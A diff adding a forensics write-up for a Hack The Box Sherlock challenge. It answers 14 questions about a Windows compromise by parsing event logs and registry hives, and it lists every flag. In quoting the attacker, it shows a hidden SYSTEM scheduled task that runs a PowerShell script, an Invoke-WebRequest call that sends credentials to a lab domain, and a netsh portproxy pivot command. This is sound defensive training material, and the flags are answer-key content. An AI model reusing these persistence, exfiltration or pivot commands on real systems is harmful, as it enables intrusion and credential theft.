@@ -1,0 +1,133 @@
+
+>[!tldr] In this Sherlock players will investigate KAPE output to see the Windows management instrumentation artifacts and persistence left by a Threat actor using the machine to pivot to an internal workstation.
+
+>[!warning] Using `Windows` OS is probably the best way to do forensics tasks for Windows
+
+- https://josephelbert.github.io/posts/htb-holmes-ctf-2025-the-enduring-echo/
+# Guided Mode
+---
+1. `What was the first (non cd) command executed by the attacker on the host?`
+	1. To read through windows logs we should target the `evtx` files. We will use [[EvtxEcmd]] Zimmerman tool to parse the logs.
+		- Location: `C/Windows/System32/winevt/logs/*`
+		- `EvtxECmd.exe -d "<\evtx-logs-dir>" --csv . --csvf parsed-evtx.csv`
+	2. Once parsed we will have the file `parsed-evtx.csv` which we will open and filter with `Timeline Explorer`. I found the row with the "**Windows Event ID**" and searched for `4688`
+		- Columns in `Timeline Explorer`:
+			1. **Event ID**: `4688` -> observe the Process Command Line information
+			2. **Time Created**: Sort by newest
+			3. **Executable Info** -> Show the command ran
+			4. *I also filtered for cmd*
+- Flag #1 -> `systeminfo`
+
+---
+2. `Which parent process (full path) spawned the attacker’s commands?`
+	1. Finding this specific log was the hard part. This question just asks for the full path of the parent process which is in the column **Payload Data** in `Timeline Explorer`
+- Flag #2 -> `C:\Windows\System32\wbem\WmiPrvSE.exe`
+
+---
+3. `Which remote-execution tool was most likely used for the attack?`
+	1. I first searched up `cmd.exe /Q /c cd /Windows/Temp 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1` which lead me to Crowdstrike's blog about "Defense Against the Lateral Arts: Detecting and Preventing Impacket’s Wmiexec" the intro paragraph then talks about "Impacket’s `wmiexec.py`". This is the program used for RCE
+- Flag #3 -> `wmiexec.py`
+
+---
+4. `What was the attacker’s IP address?`
+	1. Reading through more of the `parsed-evtx.csv` we eventually see a command ran which leads to `10.129.242.110` which is our attackers IP
+- Flag #4 -> `10.129.242.110`
+
+---
+5. `The attacker established multiple persistence mechanisms. What is set as the name of the earliest one created?`
+	1. Reading through the logs again, we notice a `schtasks` was created under `SysHelper Update`, I didn't notice this at first so i missed it, but this is the first persistent mechanism.
+```powershell
+C:\Windows\System32\cmd.exe cmd.exe /Q /c schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f 1&gt; \127.0.0.1\ADMIN$__1756076432.886685 2&gt;&amp;1
+```
+- Flag #5 -> `SysHelper Update`
+
+---
+6. `Identify the script executed by the persistence mechanism.`
+	1. With `Q5.` answered we can easily see that `JM.ps1` is the Powershell script ran by the rat. You need its full path for the flag
+- Flag #6 -> `C:\Users\Werni\Appdata\Local\JM.ps1`
+
+---
+7. `What local account did the attacker create?`
+	1. Within `parsed-evtx.csv` I filtered by the event id `4720` which is account creation, then sorted by time made. The newest account was `svc_netupd` which is the flag
+- Flag #7 -> `svc_netupd`
+
+---
+8. `What domain name did the attacker use for credential exfiltration?`
+	1. We should examine the script `JM.ps1`
+		1. Location: `The_Enduring_Echo\The_Enduring_Echo\C\Users\Werni\AppData\Local\JM.ps1`
+	2. Inside we see where the script calls too, this is our flag
+		1. `Invoke-WebRequest -Uri "http://napoleonsblackpearl.htb/Exchange<SNIP>`
+- Flag #8 -> `napoleonsblackpearl.htb`
+
+---
+9. `What password did the attacker's script generate for the newly created user?`
+	1. Inside the `JM.ps1` script the password is in plaintext 
+```powershell
+$timestamp = (Get-Date).ToString("yyyyMMddHHmmss") 
+$password = "Watson_$timestamp"
+```
+- As we can see the password is dynamic, when user `svc_netupd` was created that determines the actual password:
+	- `2025-08-24 23:05:09` -> `20250824230509`
+	- XXX `Watson_20250824230509`
+>[!warning] `From Walkthrough` However there is a 7 hour difference between the 2 times. The observed 7-hour difference between the log time and the script execution time can be attributed to daylight saving time (DST). The system is set to the Pacific Time Zone (UTC-08:00), which observes DST. During DST, the time zone shifts to UTC-07:00. In this case, the script was executed during a period when DST was in effect, resulting in a 7-hour difference from the standard time.
+- `Watson_20250824230509` -> `Watson_20250824160509`
+- Flag #9 -> `Watson_20250824160509`
+
+---
+10. `What was the IP address of the internal system the attacker pivoted to?`
+	1. To find the address I filtered by: 
+		1. **Event ID: `4688`**
+		2. **Search: `cmd`**
+	2. As i read through **Executable Info** there was the following line that looked like a *proxy*/pivot
+```shell
+C:\Windows\System32\netsh.exe netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
+```
+- As we can see there is a internal IP `192.168.1.101`. Since this is inernal it caught my eye
+- Flag #10 -> `192.168.1.101`
+
+---
+11. `Which TCP port on the victim was forwarded to enable the pivot?`
+	1. From the previous log we found that the listening port is `9999`
+- Flag #11 -> `9999`
+
+---
+12. `What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings?`
+	1. Inside the **Executable Info** we see several things but what was interesting was the port forwarding configuration
+		1. `netsh interface portproxy add v4tov4` -> I think `portproxy` or `v4tov4`will lead us to the registry path for persistent IPv4->IPv4
+	2. We will open `SELECT` hive from `C:\Windows\System32\config` with [[Registry Explorer]]. 
+		1. Here we create the clean hive `SELECT_clean` and in **Available Bookmarks** under *tcp* we see where the previous command was saved. 
+		2. Next we double click **Key:** near the bottom left to copy the registry path
+			1. `ControlSet001\Services\PortProxy\v4tov4\tcp` -> Wrong!
+		3. But that is wrong because we need to give answer related to **LIVE** host which uses **CurrentControlSet,** not **ControlSet00X**
+			1. `CurrentControlSet\Services\PortProxy\v4tov4\tcp` -> missing something...
+		4. Since we need the full path we have to add `HKLM\SYSTEM\`
+- Flag #12 -> `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`
+
+---
+13. `What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system?`
+	1. We first visit the page https://attack.mitre.org/ and then `Ctrl + F` and search for proxy. 
+	2. There are 4 subsections, but we know its `internal`. The ID for internal proxies is `T1090.001` this is the flag
+- Flag #13 -> `T1090.001`
+---
+14. `Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this?`
+	1. Inside `C:\Users\Puter\Downloads\EnduringEcho\C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline` there is the file `ConsoleHost_history.txt` which is the logs for the administrator account. Here we can see that a registry key was added to watch the command line.
+- Flag #14 -> `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f`
+
+---
+# Commands
+
+`~/temp/C/Windows/System32/winevt/logs/*`
+
+- **Chainsaw Hunt** (`csv` output)
+	- `./chainsaw hunt -r rules/ -s sigma/ -m mappings/sigma-event-logs-all.yml </evtx-log-dir> --skip-errors`
+		- Append: `--json` -> To output to json
+	
+- **Chainsaw Search** (`json` output)
+	- `./chainsaw search -t 'Event.System.EventID: =4688' </evtx-log-dir>`
+
+- **EVTX**
+	- `https://omerbenamram.github.io/evtx/` -> Web evtx viewer
+
+- **ZImmerman Tools**
+	- `EvtxECmd` -> Event log (evtx) parser with standardized CSV, XML, and json output! Custom maps, locked file support, and more!
+		- `EvtxECmd.exe -d "<\evtx-logs-dir>" --csv . --csvf parsed-evtx.csv`
